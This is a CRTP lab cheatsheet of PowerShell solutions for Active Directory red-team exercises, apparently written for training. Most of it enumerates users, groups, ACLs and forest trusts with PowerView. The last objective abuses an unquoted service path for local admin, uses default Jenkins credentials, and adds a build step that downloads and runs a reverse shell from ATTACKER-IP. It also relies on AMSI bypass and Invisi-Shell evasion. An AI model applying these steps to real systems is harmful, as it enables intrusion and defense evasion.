## CRTP Active Directory Enumeration Cheatsheet

### Learning Objective 1: Enumerate Users, Computers, Admins, and Shares

#### ✅ Enumerate Users

```powershell
# Shows samaccountname + logonCount (useful to detect decoys)
Get-DomainUser -Properties samaccountname,logonCount

# Basic list of usernames
Get-DomainUser | Select-Object -ExpandProperty samaccountname
```

#### ✅ Enumerate Domain Computers

```powershell
# Computer object names
Get-DomainComputer | Select Name

# DNS hostnames
Get-DomainComputer | Select-Object -ExpandProperty dnshostname
```

#### ✅ Enumerate Domain Admins

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# Note: MemberName and MemberSID
```

#### ✅ Enumerate Enterprise Admins

```powershell
# Standard query
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# If no output, query root domain explicitly
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
# Note: MemberName and MemberSID
```

#### ✅ Enumerate SMB Shares

```powershell
Invoke-ShareFinder -Verbose

# View contents of specific share
# Replace with actual hostname and share name
dir "\\<dnshostname>\<sharename>"
```

---

### Learning Objective 2: Enumerate OUs and GPOs

#### ✅ List All Organizational Units (OUs)

```powershell
Get-DomainOU
Get-DomainOU -Properties Name | Select-Object Name
```

#### ✅ List All Computers in StudentMachines OU

```powershell
# Get distinguishedName of OU
(Get-DomainOU -Identity "StudentMachines").distinguishedname |
ForEach-Object { Get-DomainComputer -SearchBase $_ } |
Select-Object Name
```

#### ✅ List All GPOs

```powershell
Get-DomainGPO
```

#### ✅ Enumerate GPO Applied on StudentMachines OU

```powershell
# Get OU info
gplink = (Get-DomainOU -Identity "StudentMachines").gplink

# Extract GPO ID from gplink, then run:
Get-DomainGPO -Identity '{GPO-ID}'
```

---

### Notes:

* Use Invisi-Shell and AMSI bypass before running enumeration tools.
* Always check access to shares after privilege escalation.
* Use `Select-Object *` to view all properties of objects when needed.
* Press Enter in WinRS if command output doesn't immediately display.

**Learning Objective 3**

* Enumerate following for the dollarcorp domain:
* ACL for the Users group
* ACL for the Domain Admins group
* All modify rights/permissions for the student

# **Solution -:**

### **ACL for the Users group**

```
# powerview
Get-DomainObjectAcl -Identity "Users" -ResolveGUIDs -Verbose
```

### **ACL for the Domain Admins group**

```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

### **All modify rights/permissions for the student**

```
# powerview
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student505"}
```

### **ActiveDirectory Rights for RDPUsers group**

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

> \\
>
> **Learning Objective 4**
>
> * Enumerate all domains in the moneycorp.local forest.
> * Map the trusts of the dollarcorp.moneycorp.local domain.
> * Map external trust in the moneycorp.local forest.
> * Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest ?
>
> # **Solution -:**

### **Get all domains in the current forest**

```
Get-ForestDomain -verbose 

# The "Name:" property are the domain names
# Or just filter by Name
Get-ForestDomain -verbose | select Name
```

### **Map the trusts of All Domain**

```
# Powerview
Get-DomainTrust

# Map the trust of a domain
Get-ForestDomain -verbose | select Name
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local

# Ouput you should look out for -:
# SourceName
# TargetName
# TrustAttributes
# TrustDirection
```

### **Map external trust in The moneycorp.local forest**

```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

### **Identify external trusts of the dollarcorp domain**

```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

### **Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**

```
# If the "TrustDirection" output of the previous command is either bi-directional trust or one-way trust
# Then we can use the below command

Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

**Learning Objective 5**

* Exploit a service on dcorp-studentx and elevate privileges to local administrator.
* Identify a machine in the domain where studentx has local administrative access.
* Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server

# **Solution -:**

### **Get services with unquoted paths and a space in their name {Exploit}**

* Cd to `C:\AD\Tools`
* Load Invisi-shell
* Load AMSI Bypass
* Load `Powerup.ps1` script

```
. 'C:\Ad\Tools\PowerUp.ps1'
```

* Run the `Get-ServiceUnquoted` module to check for unquoted path

```
Invoke-AllChecks

# Note down the "ServiceName:" with unquoted paths
```

* Then abuse function for `Invoke-ServiceAbuse` and add our current domain user to the local Administrators group

```
# -Name: Name of service to abuse
# -Username: Name of current user, Just run the whoami cmd
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  
```

We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!

### **Identify a machine in the domain where present user has local administrative access**

* Cd to `C:\AD\Tools`
* Load Invisi-shell
* Load AMSI Bypass
* Load `Find-PSRemotingLocalAdminAccess.ps1` script

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

* Fond local administrative access

```
Find-PSRemotingLocalAdminAccess
```

* We can the connect to the machines found using `winrs` or `Enter-PSSession`(Powershell Remoting)

```
# winrs
winrs -r:dcorp-adminsrv cmd
set username
set computername

# powershell remoting
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.loca
$env:username
```

### **Jenkins**

* Navigate to the Jenkins instance `http://172.16.3.11:8080`
* Log in with default credentials, in this case `build:build`, or check google for **default Jenkins credentials**
* Turn off all windows firewall settings
* Start up `hfs.exe` (HTTP File Server) located under `C:\AD\Tools\`
* Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
* Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:

```
powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443

# Replace attacker IP with your IP Address, Run "ipconfig" to see it
```

* Start up your listener with `netcat.exe`

```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

* Hit **Apply** and then **Save** and on the left side bar, you should see a **Build Now** button, Click it.
* You should then see your reverse shell as `dcorp-ci`
